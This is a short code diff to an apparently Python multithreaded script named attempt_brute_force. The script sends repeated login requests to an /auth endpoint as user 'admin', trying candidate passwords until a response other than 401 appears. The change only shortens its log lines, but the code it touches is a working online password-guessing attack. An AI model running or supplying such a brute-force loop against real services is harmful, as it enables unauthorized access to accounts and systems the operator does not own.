@@ -38,7 +38,7 @@ def attempt_brute_force():
                         f"{url}/auth?username=admin&authType=password&value={test}",
                         timeout=5
                     )
-                    print(f"Loop: {current_loop}, Password: {test}, Status Code: {req.status_code}, Response: {req.text}")
+                    print(f"tid={current_loop} | val={test} | code={req.status_code} | res={req.text}")
 
                     if req.status_code != 401:
                         print("Found the password!", test)
@@ -46,7 +46,7 @@ def attempt_brute_force():
                     break
 
                 except requests.RequestException as e:
-                    print(f"[ERROR] Loop {current_loop}, Password: {test}, Error: {str(e)}")
+                    print(f"[ERROR] tid={current_loop} | val={test} | Error={str(e)}")
                     time.sleep(cooldown_sec)
 
 threads = []
